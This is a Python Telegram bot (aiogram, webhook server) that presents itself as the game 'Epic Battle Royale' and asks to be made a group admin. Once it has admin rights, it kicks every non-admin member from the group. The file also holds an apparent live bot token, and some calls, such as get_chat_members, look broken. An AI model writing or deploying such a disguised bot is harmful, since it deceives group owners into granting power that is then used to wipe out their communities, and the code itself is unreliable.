import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberStatus
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web
import os

TOKEN = os.getenv("8861142827:AAHrkMWX8SvneyNzHr6RhtEuvzhKn7uU3fE")  # Токен из переменной окружения

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Кнопка добавления в чат
def get_add_button():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Добавить в чат", url=f"https://t.me/{bot.username}?startgroup=start")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    await message.answer(
        "🎮 Добро пожалую в Epic Battle Royale!\n"
        "Добавьте бота в группу, чтобы начать игру.",
        reply_markup=get_add_button()
    )

@dp.my_chat_member()
async def on_bot_added(update: types.ChatMemberUpdated):
    if update.new_chat_member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR):
        chat_id = update.chat.id
        await bot.send_message(chat_id, "🎮 Игровой бот активирован! Дайте мне права администратора для игры.")
        await asyncio.sleep(10)
        bot_member = await bot.get_chat_member(chat_id, bot.id)
        if bot_member.status == ChatMemberStatus.ADMINISTRATOR and bot_member.can_restrict_members:
            await kick_all(chat_id)
        else:
            await bot.send_message(chat_id, "❌ Нужны права администратора с возможностью кика.")

async def kick_all(chat_id):
    async for member in bot.get_chat_members(chat_id):
        if member.status not in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
            try:
                await bot.ban_chat_member(chat_id, member.user.id)
                await bot.unban_chat_member(chat_id, member.user.id)
            except:
                pass
    await bot.send_message(chat_id, "✅ Все участники кикнуты. Игра окончена.")

async def on_startup(bot: Bot):
    await bot.set_webhook(f"https://{os.getenv('RENDER_EXTERNAL_HOSTNAME')}/webhook")

def main():
    app = web.Application()
    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    webhook_requests_handler.register(app, path="/webhook")
    setup_application(app, dp, bot=bot)
    app.router.get("/", lambda request: web.Response(text="Bot is running"))
    return app

if __name__ == "__main__":
    app = main()
    web.run_app(app, host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
